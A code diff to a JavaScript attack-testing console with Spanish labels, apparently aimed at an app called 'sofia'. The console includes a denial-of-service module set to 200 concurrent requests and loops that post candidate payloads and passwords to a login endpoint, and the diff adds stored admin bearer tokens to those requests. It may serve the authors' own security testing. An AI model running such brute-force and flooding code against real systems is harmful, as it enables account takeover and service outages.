@@ -542,6 +542,7 @@
             config: `<label class="cfg-label">CONCURRENCIA (PETICIONES)</label><input class="cfg-input" id="dos-count" value="200">`,
             run: runDoS
         }
+    };
 
     function tLog(msg, type = 'green') {
         const out = document.getElementById('t-out');
@@ -612,8 +613,13 @@
         await delay(800);
 
         try {
+            const token = localStorage.getItem('sofia_token_ADMIN') || localStorage.getItem('sofia_token_v1');
             const r = await fetch(TARGET + ep, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                method: 'POST', 
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Authorization': token ? `Bearer ${token}` : ''
+                },
                 body: JSON.stringify({ email: p, password: 'x' })
             });
 
@@ -660,8 +666,13 @@
             await delay(200);
 
             try {
+                const token = localStorage.getItem('sofia_token_ADMIN') || localStorage.getItem('sofia_token_v1');
                 const r = await fetch(TARGET + ep, {
-                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    method: 'POST', 
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'Authorization': token ? `Bearer ${token}` : ''
+                    },
                     body: JSON.stringify({ email: user, password: p })
                 });
 
